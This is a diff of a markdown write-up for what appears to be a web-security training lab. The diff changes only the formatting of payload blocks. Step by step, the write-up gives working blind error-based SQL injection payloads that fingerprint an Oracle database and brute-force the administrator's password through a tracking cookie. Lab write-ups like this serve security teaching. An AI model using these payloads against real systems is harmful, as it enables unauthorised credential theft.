@@ -376,23 +376,29 @@ The value of the TrackingId field used for page analytics in this question is `y
 
 ### Solution
 First, I needed to find out the version of SQL running on the server. Since the server returns errors to the front end, we can try to see if it's MySQL/PostgreSQL first. If an error is returned, then it's likely to be Oracle. This time, we use concatenation as we do not have any feedback to tell between true or false using logical `AND` operations: 
-> `SELECT VERSION()` \
-> \>>> \
-> `ygERiCVbJs6ai6ZH'||(SELECT VERSION() FROM DUAL)+--+` 
+> ```sql
+> SELECT VERSION()
+> >>>
+> ygERiCVbJs6ai6ZH'||(SELECT VERSION() FROM DUAL)+--+
+> ```
 
 The reason why we use `FROM DUAL` regardless of version is because Oracle SQL DBs require a `FROM` statement to be used with `SELECT`. Since it's compatible with both, doing this will save us the checks. 
 
 Incidentally, the above returns a `500 Internal Server Error`, which means the database is likely Oracle. We can test this with the following: 
-> `SELECT banner FROM v$version WHERE ROWNUM=1` \
-> \>>> \
-> `ygERiCVbJs6ai6ZH'||(SELECT+banner+FROM+v$version+WHERE+ROWNUM%3d1)`
+> ```sql
+> SELECT banner FROM v$version WHERE ROWNUM=1
+> >>>
+> ygERiCVbJs6ai6ZH'||(SELECT+banner+FROM+v$version+WHERE+ROWNUM%3d1)
+> ```
 
 We use `WHERE ROWNUM=1` here because in Oracle, `SELECT banner FROM v$version` may return multiple values. Since the former fragment of this query presumably only returns one row, the concatenation will break if we don't restrict the latter fragment to only return one row.
 
 The above request resulted in a `200 OK` when I submitted it, strongly suggesting that the underlying database is Oracle. Therefore the next step is to check whether the database `users` along with its columns `username` and `password` exist: 
->`SELECT password FROM users WHERE username='administrator'` \
-> \>>> \
-> `ygERiCVbJs6ai6ZH'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')+--+`
+> ```sql
+> SELECT password FROM users WHERE username='administrator'
+> >>>
+> ygERiCVbJs6ai6ZH'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')+--+
+> ```
 
 The above ensures that all three exist all in one query. If an error occurs at all, that means one of them does not exist, and extra checks are required to ascertain which one it is. When I tried the query, it returned a `200 OK`, meaning all three must exist as no errors occured.
 
@@ -415,9 +421,11 @@ We receive the following results from Intruder:
 <img src="./blind-error-pwd-len.png" width=400>
 
 As seen, the status code goes from `200` to `500` as `seq=20`. This means that the password is of length exactly 20. With this, we can now start to brute-force the password, similar to [11](#11-blind-sql-injection-with-conditional-responses):
-> `SELECT CASE WHEN SUBSTR(password, {seq}, 1)='{char}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator'` \
-> \>>> \
-> `ygERiCVbJs6ai6ZH'||(SELECT+CASE+WHEN+SUBSTR(password,{seq},1)%3d'{char}'+THEN+TO_CHAR(1/0)+ELSE+''+END+FROM+users+WHERE+username%3d'administrator')+--+`
+> ```sql
+> SELECT CASE WHEN SUBSTR(password, {seq}, 1)='{char}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator'
+> >>> 
+> ygERiCVbJs6ai6ZH'||(SELECT+CASE+WHEN+SUBSTR(password,{seq},1)%3d'{char}'+THEN+TO_CHAR(1/0)+ELSE+''+END+FROM+users+WHERE+username%3d'administrator')+--+
+>```
 
 ~~Now we wait a century for 720 requests to finish...~~
 Done! The following is the result of the Cluster Bomb attack:
